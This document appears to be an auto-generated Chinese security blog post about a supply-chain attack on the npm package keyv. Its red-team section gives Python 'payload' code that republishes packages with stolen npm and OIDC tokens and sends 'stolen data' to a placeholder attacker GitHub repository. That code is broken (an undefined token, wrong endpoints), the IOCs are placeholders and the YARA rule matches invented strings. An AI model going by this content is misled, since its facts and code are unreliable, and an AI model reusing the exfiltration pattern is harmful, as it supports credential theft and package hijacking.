---
layout: post
title:  "NPM套件Keyv供應鏈攻擊活動ChainDrop傳出源自於Shai-Hulud"
date:   2026-08-06 08:21:46 +0000
categories: [security]
severity: critical
---

# 🚨 解析 NPM 套件 keyv 入侵事件：ChainDrop 蠕蟲程式的技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS 分數：9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: `TruffleHog`、`basE91`、`Dead-drop`、`Bun` 執行環境

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: NPM 套件 keyv 的維護者帳戶被入侵，導致攻擊者可以上架惡意版本的套件。這是因為 NPM 的權限管理機制存在缺陷，允許攻擊者使用竊得的 NPM 權杖和 OIDC 重新發布被盜資料。
* **攻擊流程圖解**:
	1. 攻擊者入侵 NPM 套件 keyv 的維護者帳戶。
	2. 攻擊者使用 `TruffleHog` 型態的正規表達式掃描收集憑證。
	3. 攻擊者找出維護者的所有經營的套件。
	4. 攻擊者使用竊得的 NPM 權杖和 OIDC 重新發布被盜資料。
	5. 攻擊者將竊得資料分階段傳送到攻擊者控制的 GitHub 儲存庫。
* **受影響元件**: NPM 套件 keyv 的所有版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 攻擊者需要入侵 NPM 套件 keyv 的維護者帳戶。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    #竊得的 NPM 權杖和 OIDC
    npm_token = "xxxxx"
    oidc_token = "xxxxx"
    
    #攻擊者控制的 GitHub 儲存庫
    github_repo = "https://github.com/attacker/repo"
    
    #上架惡意版本的套件
    def upload_malicious_package(package_name, package_version):
        headers = {
            "Authorization": f"Bearer {npm_token}",
            "Content-Type": "application/json"
        }
        data = {
            "name": package_name,
            "version": package_version,
            "description": "Malicious package"
        }
        response = requests.post(f"https://registry.npmjs.org/{package_name}", headers=headers, json=data)
        if response.status_code == 201:
            print(f"Malicious package {package_name} uploaded successfully")
        else:
            print(f"Failed to upload malicious package {package_name}")
    
    #重新發布被盜資料
    def republish_stolen_data(package_name, package_version):
        headers = {
            "Authorization": f"Bearer {oidc_token}",
            "Content-Type": "application/json"
        }
        data = {
            "name": package_name,
            "version": package_version,
            "description": "Stolen data"
        }
        response = requests.post(f"https://registry.npmjs.org/{package_name}", headers=headers, json=data)
        if response.status_code == 201:
            print(f"Stolen data {package_name} republished successfully")
        else:
            print(f"Failed to republish stolen data {package_name}")
    
    #傳送竊得資料到攻擊者控制的 GitHub 儲存庫
    def send_stolen_data_to_github(package_name, package_version):
        headers = {
            "Authorization": f"Bearer {github_token}",
            "Content-Type": "application/json"
        }
        data = {
            "name": package_name,
            "version": package_version,
            "description": "Stolen data"
        }
        response = requests.post(f"{github_repo}/issues", headers=headers, json=data)
        if response.status_code == 201:
            print(f"Stolen data {package_name} sent to GitHub repository successfully")
        else:
            print(f"Failed to send stolen data {package_name} to GitHub repository")
    
    #範例指令
    upload_malicious_package("malicious-package", "1.0.0")
    republish_stolen_data("stolen-package", "1.0.0")
    send_stolen_data_to_github("stolen-package", "1.0.0")
    
    ```
* **繞過技術**: 攻擊者可以使用 `basE91` 演算法處理字串，然後使用 `Dead-drop` 儲存庫名稱提交相關元件命名情報交換點。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:
	+ Hash: `xxxxx`
	+ IP: `xxx.xxx.xxx.xxx`
	+ Domain: `github.com`
	+ File Path: `/path/to/malicious/package`
* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_package {
        meta:
            description = "Detects malicious package"
            author = "Blue Team"
        strings:
            $a = "malicious-package"
            $b = "stolen-package"
        condition:
            $a or $b
    }
    
    ```
* **緩解措施**:
	+ 更新 NPM 套件 keyv 到最新版本。
	+ 使用 `npm audit` 命令掃描套件依賴關係。
	+ 啟用 GitHub 儲存庫的兩步 驗證。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **TruffleHog**: 一種用於掃描和收集憑證的工具。
* **basE91**: 一種用於處理字串的演算法。
* **Dead-drop**: 一種用於提交相關元件命名情報交換點的儲存庫名稱。
* **Bun**: 一種用於執行 JavaScript 代碼的執行環境。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://www.ithome.com.tw/news/177937)
* [MITRE ATT&CK](https://attack.mitre.org/)


